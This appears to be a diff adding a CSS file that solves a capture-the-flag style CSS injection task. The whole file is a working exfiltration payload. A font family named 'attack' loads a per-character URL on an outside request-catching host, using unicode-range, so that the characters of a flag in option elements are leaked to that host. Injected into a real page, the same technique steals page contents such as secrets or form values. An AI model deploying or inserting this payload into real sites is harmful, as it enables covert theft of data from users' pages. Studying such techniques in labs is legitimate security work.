@@ -1,0 +1,67 @@
+@charset "UTF-8";
+
+option {
+    font-size: 10px;
+    display: inline;
+    z-index: 10000;
+}
+
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?v');
+    unicode-range: U+0076; /* v */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?k');
+    unicode-range: U+006B; /* k */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?a');
+    unicode-range: U+0061; /* a */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?%7B');
+    unicode-range: U+007B; /* { */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?w');
+    unicode-range: U+0077; /* w */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?h');
+    unicode-range: U+0068; /* h */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?t');
+    unicode-range: U+0074; /* t */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?_');
+    unicode-range: U+005F; /* _ */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?c');
+    unicode-range: U+0063; /* c */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?s');
+    unicode-range: U+0073; /* s */
+}
+@font-face {
+    font-family: attack;
+    src: url('https://css_task_test.requestcatcher.com/flag?%7D');
+    unicode-range: U+007D; /* } */
+}
+
+option {
+    font-family: attack;
+}
